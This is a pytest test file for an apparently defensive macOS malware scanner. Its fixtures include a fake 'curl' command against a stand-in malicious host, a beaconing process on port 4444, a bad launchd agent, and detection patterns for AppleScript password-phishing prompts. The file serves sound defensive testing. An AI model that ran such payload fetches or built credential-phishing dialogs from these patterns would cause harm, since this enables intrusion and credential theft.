import time
from pathlib import Path

from src.mac_sentinel.core.content_filters import should_scan_content
from src.mac_sentinel.core.diagnostics import DiagnosticsService
from src.mac_sentinel.core.monitor import MonitorService
from src.mac_sentinel.core.scanner import RuleEngine, ScanService
from src.mac_sentinel.core.state import AppStateStore


class FakeRuleRepository:
    def __init__(self, rules):
        self._rules = rules

    def all_rules(self):
        return list(self._rules)

    def network_rules(self):
        return [rule for rule in self._rules if rule.get('network_remote_ports') or rule.get('network_proc_name_regexes')]


class FakeCollector:
    def __init__(self, suspicious_path: str, text_payload: str = 'curl https://malicious.example/payload'):
        self.suspicious_path = suspicious_path
        self.text_payload = text_payload
        self._processes = [
            {'pid': 222, 'user': 'tester', 'comm': 'evilproc', 'args': '/tmp/evilproc --beacon'},
            {'pid': 777, 'user': 'tester', 'comm': 'python', 'args': 'python app.py'},
        ]
        self._launchd = [{'pid': 222, 'status': '0', 'label': 'com.bad.agent'}]
        self._network = [
            {
                'command': 'evilproc',
                'pid': 222,
                'user': 'tester',
                'fd': '10u',
                'protocol': 'TCP',
                'name': '127.0.0.1:5555->198.51.100.7:4444',
                'local_address': '127.0.0.1',
                'local_port': 5555,
                'remote_address': '198.51.100.7',
                'remote_port': 4444,
            }
        ]

    def clear(self):
        return None

    def configure_controls(self, should_pause, should_stop):
        return None

    def glob_paths(self, pattern: str):
        return [self.suspicious_path] if 'suspicious' in pattern else []

    def read_text(self, path: str, max_bytes: int, skip_binary: bool = True):
        return self.text_payload

    def parse_plist(self, path: str):
        return {'Label': 'com.bad.agent', 'Program': '/tmp/evilproc', 'ProgramArguments': ['/tmp/evilproc', '--beacon']}

    def collect_processes(self, fresh: bool = False):
        return list(self._processes)

    def collect_launchctl_labels(self, fresh: bool = False):
        return list(self._launchd)

    def collect_network_connections(self, fresh: bool = False):
        return list(self._network)


RULES = [
    {
        'id': 'file_rule',
        'title': 'Suspicious payload file',
        'family': 'Test',
        'threat_level': 'high',
        'author_or_actor': 'Unit Test',
        'description': 'Matches a suspicious file path.',
        'file_globs': ['/tmp/**/suspicious*'],
        'filename_regexes': ['suspicious'],
        'path_regexes': [],
        'content_regexes': [],
        'content_extensions_include': [],
        'content_extensions_exclude': [],
        'plist_label_regexes': [],
        'plist_program_regexes': [],
        'plist_argument_regexes': [],
        'process_name_regexes': [],
        'process_name_exclude_regexes': [],
        'process_cmdline_regexes': [],
        'process_cmdline_exclude_regexes': [],
        'launchd_label_regexes': [],
        'launchd_label_exclude_regexes': [],
        'network_proc_name_regexes': [],
        'network_proc_name_exclude_regexes': [],
        'network_proc_cmdline_regexes': [],
        'network_proc_cmdline_exclude_regexes': [],
        'network_remote_host_regexes': [],
        'network_remote_host_exclude_regexes': [],
        'network_local_host_regexes': [],
        'network_local_host_exclude_regexes': [],
        'network_protocols': [],
        'network_remote_ports': [],
        'network_local_ports': [],
    },
    {
        'id': 'process_rule',
        'title': 'Beaconing process',
        'family': 'Test',
        'threat_level': 'mid',
        'author_or_actor': 'Unit Test',
        'description': 'Matches the fake evil process.',
        'file_globs': [],
        'filename_regexes': [],
        'path_regexes': [],
        'content_regexes': [],
        'content_extensions_include': [],
        'content_extensions_exclude': [],
        'plist_label_regexes': [],
        'plist_program_regexes': [],
        'plist_argument_regexes': [],
        'process_name_regexes': ['evilproc'],
        'process_name_exclude_regexes': [],
        'process_cmdline_regexes': ['beacon'],
        'process_cmdline_exclude_regexes': [],
        'launchd_label_regexes': ['com\\.bad\\.agent'],
        'launchd_label_exclude_regexes': [],
        'network_proc_name_regexes': ['evilproc'],
        'network_proc_name_exclude_regexes': [],
        'network_proc_cmdline_regexes': ['beacon'],
        'network_proc_cmdline_exclude_regexes': [],
        'network_remote_host_regexes': ['198\\.51\\.100\\.7'],
        'network_remote_host_exclude_regexes': [],
        'network_local_host_regexes': [],
        'network_local_host_exclude_regexes': [],
        'network_protocols': ['TCP'],
        'network_remote_ports': [4444],
        'network_local_ports': [],
    },
]


def test_scan_service_generates_findings_and_live_logs(tmp_path):
    suspicious = tmp_path / 'suspicious_payload.sh'
    suspicious.write_text('echo test')

    state = AppStateStore()
    scanner = ScanService(
        collector=FakeCollector(str(suspicious)),
        rule_repository=FakeRuleRepository(RULES),
        state_store=state,
    )

    state.begin_scan(total_rules=len(RULES))
    results = scanner.run_full_scan()

    assert len(results) >= 3
    assert state.scan_status()['progress_percent'] == 100
    messages = [entry['message'] for entry in state.scan_logs()]
    assert any('Starting full scan' in message for message in messages)
    assert any('Matched' in message for message in messages)


def test_monitor_service_records_observation_logs_and_events(tmp_path):
    suspicious = tmp_path / 'suspicious_payload.sh'
    suspicious.write_text('echo test')

    state = AppStateStore()
    scanner = ScanService(
        collector=FakeCollector(str(suspicious)),
        rule_repository=FakeRuleRepository(RULES),
        state_store=state,
    )
    monitor = MonitorService(scan_service=scanner, state_store=state, interval_seconds=0.05)

    started = monitor.start()
    assert started is True
    time.sleep(0.16)
    monitor.stop()
    time.sleep(0.06)

    assert state.monitor_status()['event_count'] >= 1
    log_messages = [entry['message'] for entry in state.monitor_logs()]
    assert any('Observed' in message for message in log_messages)
    assert any('Flagged' in message for message in log_messages)


def test_diagnostics_report_has_expected_shape():
    report = DiagnosticsService().get_report()
    assert 'commands' in report
    assert 'permission_checks' in report
    assert 'python_executable' in report


def test_content_filter_skips_app_bundle_and_binary_noise():
    assert should_scan_content('/Users/test/Downloads/Visual Studio Code.app/Contents/Resources/en.lproj/locale.pak', {'skip_app_bundle_content': True}) is False
    assert should_scan_content('/Users/test/Downloads/image.jpg', {'skip_app_bundle_content': True}) is False
    assert should_scan_content('/Users/test/Documents/script.sh', {'skip_app_bundle_content': True}) is True


def test_content_rules_can_require_multiple_hits(tmp_path):
    rule = {
        'id': 'applescript_password_prompt',
        'title': 'AppleScript credential prompt',
        'family': 'Test',
        'threat_level': 'high',
        'author_or_actor': 'Unit Test',
        'description': 'Requires two suspicious indicators.',
        'file_globs': ['/tmp/**/suspicious*'],
        'filename_regexes': [],
        'exclude_filename_regexes': [],
        'path_regexes': [],
        'exclude_path_regexes': [],
        'content_regexes': [r'(?i)(display dialog .*password|with hidden answer)', r'(?i)(osascript|administrator privileges)'],
        'content_min_matches': 2,
        'content_match_mode': 'any',
        'content_extensions_include': ['.sh', '.js'],
        'content_extensions_exclude': [],
        'skip_app_bundle_content': True,
        'skip_binary_content': True,
        'plist_label_regexes': [],
        'plist_program_regexes': [],
        'plist_argument_regexes': [],
        'process_name_regexes': [],
        'process_name_exclude_regexes': [],
        'process_cmdline_regexes': [],
        'process_cmdline_exclude_regexes': [],
        'launchd_label_regexes': [],
        'launchd_label_exclude_regexes': [],
        'network_proc_name_regexes': [],
        'network_proc_name_exclude_regexes': [],
        'network_proc_cmdline_regexes': [],
        'network_proc_cmdline_exclude_regexes': [],
        'network_remote_host_regexes': [],
        'network_remote_host_exclude_regexes': [],
        'network_local_host_regexes': [],
        'network_local_host_exclude_regexes': [],
        'network_protocols': [],
        'network_remote_ports': [],
        'network_local_ports': [],
    }
    engine = RuleEngine(FakeCollector(str(tmp_path / 'suspicious.js'), text_payload='const x = "osascript";'))
    findings = engine.evaluate_rule(rule)
    assert findings == []

    engine = RuleEngine(FakeCollector(str(tmp_path / 'suspicious.js'), text_payload='osascript\ndisplay dialog "Enter password" with hidden answer'))
    findings = engine.evaluate_rule(rule)
    assert len(findings) == 1


def test_launchctl_exclude_regex_prevents_vendor_noise(tmp_path):
    suspicious = tmp_path / 'suspicious_payload.sh'
    suspicious.write_text('echo test')
    collector = FakeCollector(str(suspicious))
    collector._launchd = [
        {'pid': 10, 'status': '0', 'label': 'com.apple.WindowManager.agent'},
        {'pid': 11, 'status': '0', 'label': 'com.bad.hiddenhelper.agent'},
    ]
    rule = {
        'id': 'launchd_noise',
        'title': 'Noisy labels',
        'family': 'Test',
        'threat_level': 'low',
        'author_or_actor': 'Unit Test',
        'description': 'Exclude Apple labels.',
        'file_globs': [],
        'filename_regexes': [],
        'exclude_filename_regexes': [],
        'path_regexes': [],
        'exclude_path_regexes': [],
        'content_regexes': [],
        'content_extensions_include': [],
        'content_extensions_exclude': [],
        'plist_label_regexes': [],
        'plist_program_regexes': [],
        'plist_argument_regexes': [],
        'process_name_regexes': [],
        'process_name_exclude_regexes': [],
        'process_cmdline_regexes': [],
        'process_cmdline_exclude_regexes': [],
        'launchd_label_regexes': [r'(?i)(agent|helper)'],
        'launchd_label_exclude_regexes': [r'^com\.apple\.'],
        'network_proc_name_regexes': [],
        'network_proc_name_exclude_regexes': [],
        'network_proc_cmdline_regexes': [],
        'network_proc_cmdline_exclude_regexes': [],
        'network_remote_host_regexes': [],
        'network_remote_host_exclude_regexes': [],
        'network_local_host_regexes': [],
        'network_local_host_exclude_regexes': [],
        'network_protocols': [],
        'network_remote_ports': [],
        'network_local_ports': [],
    }
    engine = RuleEngine(collector)
    findings = engine.evaluate_rule(rule)
    assert len(findings) == 1
    assert findings[0].launchd_label == 'com.bad.hiddenhelper.agent'
